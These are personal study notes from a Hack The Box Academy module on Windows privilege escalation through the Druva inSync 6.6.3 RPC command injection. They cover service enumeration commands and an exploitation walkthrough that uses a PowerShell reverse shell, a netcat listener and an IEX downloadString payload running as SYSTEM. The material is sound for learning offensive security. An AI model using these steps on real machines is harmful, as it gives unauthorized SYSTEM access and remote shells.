
2026-05-23 15:48

Tags: #escalation 

## Vulnerable Services

- **The Risk of Third-Party Apps:** Even fully patched and securely configured Windows operating systems can be compromised if users are allowed to install third-party software that contains vulnerabilities.


- **High-Privilege Services:** Many client applications (like backup tools) install services that run under the context of `NT AUTHORITY\SYSTEM`. If these services expose unsecured communication channels, local users can exploit them to escalate privileges.


- **Case Study:** _Druva inSync version 6.6.3_ runs an RPC service locally on port 6064 as `SYSTEM` and is vulnerable to a command injection flaw.

## The Enumeration Phase

- Before attempting exploitation, a structured enumeration workflow is used to confirm the vulnerability exists:
	- **Identify Installed Programs:** Run `wmic product get name` via CMD to list installed applications and flag non-standard software like `Druva inSync 6.6.3`.
		- ![[Pasted image 20260523155646.png]]
		  
	- **Verify Local Open Ports:** Use `netstat -ano | findstr 6064` to verify if the application's local RPC port is actively listening.
		- ![[Pasted image 20260523155709.png]]
		  
	- **Map Port to Process ID (PID):** Use the PID found from netstat to map it back to the active process executable using PowerShell's `get-process -Id <PID>`
		- ![[Pasted image 20260523155727.png]]
		  
	- **Confirm Service Status:** Run `get-service | ? {$_.DisplayName -like 'Druva*'}` to verify the service name (`inSyncCPHService`) and ensure it is actively running.
		- ![[Pasted image 20260523155736.png]]

## The Exploitation Phase

- **Prepare the Payload**
	- Download a reverse shell script (like `Invoke-PowerShellTcp.ps1`), rename it to `shell.ps1`, and append the reverse shell execution command pointing back to your attack box IP and port at the bottom of the file.
		- ![[Screenshot_20260523_164927.png]]


- **Host the Script & Start Listener**
	- Start a local Python web server (`python3 -m http.server 8080`) in the directory containing `shell.ps1`. In a separate terminal, spin up a Netcat listener (`nc -lvnp 9443`) to catch the incoming connection.


- **Modify the PowerShell PoC**
	- Take the Druva inSync RPC exploit script and modify the `$cmd` variable to instruct PowerShell to download and execute your hosted shell script directly into memory using `IEX(New-Object Net.Webclient).downloadString('...')`.
		- ![[Screenshot_20260523_164840.png]]


- **Execute and Trigger Shell**
	- Bypass the execution policy in your session (`Set-ExecutionPolicy Bypass -Scope Process`) and run the modified PoC script. The local RPC service will parse the path manipulation payload and execute the download command under the context of `NT AUTHORITY\SYSTEM`.
## References:

https://academy.hackthebox.com/app/module/67/section/910